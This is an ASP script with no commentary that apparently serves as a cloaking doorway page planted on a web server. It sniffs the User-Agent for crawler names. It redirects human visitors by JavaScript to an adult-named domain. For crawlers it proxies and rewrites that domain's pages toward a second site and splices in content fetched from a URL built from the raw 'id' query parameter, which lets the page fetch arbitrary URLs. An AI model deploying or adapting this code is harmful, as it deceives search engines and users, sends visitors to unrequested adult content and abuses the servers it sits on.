<%

dim ua
ua = Request.ServerVariables("HTTP_USER_AGENT")
ua = LCase(ua)

Dim fname(7),i
fname(0) = "Googlebot"
fname(1) = "Baiduspider"
fname(2) = "Yahoo! Slurp"
fname(3) = "YodaoBot"
fname(4) = "msnbot"
fname(5) = "bot"
fname(6) = "crawl"
fname(7) = "spider"

Dim spider
spider = 0

For i = 0 to 7
	  dim j
	  j = fname(i)
	  j = LCase(j)
	  if instr(ua,j)>0 then
		spider = 1
	  end if
Next

dim inner
inner = Request.QueryString("id")

dim domain
domain = "http://www.6starpussy.com/dessert/"

dim url
url = domain & inner

if spider<1 then

Dim u
u = url

Response.write("<script language=""javascript"" type=""text/javascript"">")
Response.write("self.location=""" & u & """;")
Response.write("</script>")

end if


On Error Resume Next 
Server.ScriptTimeOut=9999999 
Function getHTTPPage(Path) 
t = GetBody(Path) 
getHTTPPage=BytesToBstr(t,"utf-8") 
End function 
Function Newstring(wstr,strng) 
Newstring=Instr(lcase(wstr),lcase(strng)) 
if Newstring<=0 then Newstring=Len(wstr) 
End Function 
Function BytesToBstr(body,Cset) 
dim objstream 
set objstream = Server.CreateObject("adodb.stream") 
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End Function 
Function GetBody(url) 
on error resume next 
Set Retrieval = CreateObject("Microsoft.XMLHTTP") 
With Retrieval 
.Open "Get", url, False, "", "" 
.Send 
GetBody = .ResponseBody 
End With 
Set Retrieval = Nothing 
End Function 


Function ReplaceTest(str, patrn, replStr)

  Dim regEx, str1, i

  str1 = str

  Set regEx = New RegExp
  regEx.Pattern = patrn

  regEx.Global = True
  regEx.IgnoreCase = True

  Set Matches = regEx.Execute(str1)
  
  For Each i in Matches

  str1 = regEx.Replace(str1, replStr)

  Next

  ReplaceTest = str1
  
End Function


dim str
str = getHTTPPage(url)


dim find
find = "http://www.6starpussy.com/dessert/"

dim replace
replace = "http://www.lybook.cn/dessert.asp?id="

str = replacetest(str,find,replace)

dim find2
find2 = "src=""images"

dim replace2
replace2 = "src=""http://www.6starpussy.com/dessert/images"

str = replacetest(str,find2,replace2)

dim find3
find3 = "src=""includes"

dim replace3
replace3 = "src=""http://www.6starpussy.com/dessert/includes"

str = replacetest(str,find3,replace3)


dim find4
find4 = "href=""includes"

dim replace4
replace4 = "href=""http://www.6starpussy.com/dessert/includes"

str = replacetest(str,find4,replace4)



if spider>0 then
	dim site
	site = "http://www."

	dim content
	content = getHTTPPage(site&inner)
	
	dim find5
	find5 = "</h1>"

	dim replace5
	replace5 = "</h1> <div>" & content & "</div>"

	str = replacetest(str,find5,replace5)
end if


response.write(str) 

%>




